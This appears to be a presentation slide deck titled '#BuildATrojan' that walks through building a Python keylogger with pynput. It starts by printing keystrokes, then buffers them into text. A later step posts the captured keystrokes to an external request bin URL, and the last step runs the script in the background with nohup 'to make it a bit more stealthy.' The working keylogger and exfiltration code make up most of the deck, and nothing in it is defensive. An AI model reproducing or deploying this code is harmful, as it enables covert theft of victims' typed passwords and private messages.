class: center, middle

# trojan.saurabhn.com

---

class: center, middle

# @EXTREMOPHILARUM

---
class: center, middle

# #BuildATrojan

---

# Here's the Agenda

1. History
2. The virus
3. Building one

---
# History

.center[![Trojan](https://allthatsinteresting.com/wordpress/wp-content/uploads/2021/12/still-from-troy.png)]

---
class: center, middle
# Trojan Virus

.center[![Trojan](https://autodesk.blogs.com/.a/6a00d8341bfd0c53ef01b8d29a32e9970c-pi)]

---
class: center, middle
# Building a Trojan

---
class: center, middle

# Prerequisites
```bash
pip install pynput
```

---
### Step 1: Lets print all keystrokes to the console


```python
from pynput.keyboard import Key, Listener

def on_press(key):
    print(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```

---
### Step 2: Lets print a line to the console when a key is pressed

```python
from pynput.keyboard import Listener
keys = ''
def send_keys():
    global keys
    print(keys)
    keys = ''

def on_press(key):
    global keys
    str_key = str(key)
    if str_key == "Key.tab":
        str_key = '\t'
    elif str_key == "Key.enter":
        str_key = '\n'
    elif str_key == "Key.space":
        str_key = ' '
    elif str_key == "Key.backspace":
        str_key = ' bspace '
    elif "Key" in str_key:
        str_key = str_key.replace("Key.", "")
        str_key = f" {str_key} "
    keys += str_key.strip('\'')
    if len(keys) >= 20:
        send_keys()

with Listener(on_press=on_press) as listener:
    listener.join()
```

---

### Step 3: Lets create a request bin

- Open [Request bin](https://requestbin.net/)

- Click **Create a RequestBin** 
---
### Step 4: Sending data to the bin
```python
from pynput.keyboard import Key, Listener
import requests
keys = ''
request_bin_url = 'https://{request bin url}'
def send_keys():
    global keys
    print(keys)
    requests.post(request_bin_url, data=keys)
    keys = ''
def on_press(key):
    global keys
    str_key = str(key)
    if str_key == "Key.tab":
        str_key = '\t'
    elif str_key == "Key.enter":
        str_key = '\n'
    elif str_key == "Key.space":
        str_key = ' '
    elif str_key == "Key.backspace":
        str_key = ' bspace '
    elif "Key" in str_key:
        str_key = str_key.replace("Key.", "")
        str_key = f" {str_key} "
    keys += str_key.strip('\'')
    if len(keys) >= 20:
        send_keys()

with Listener(on_press=on_press) as listener:
    listener.join()
```

---
### Step 5: Lets make it a bit more stealthy

```bash
nohup python3 send_line.py &
```

---
class: center, middle

# Any questions?
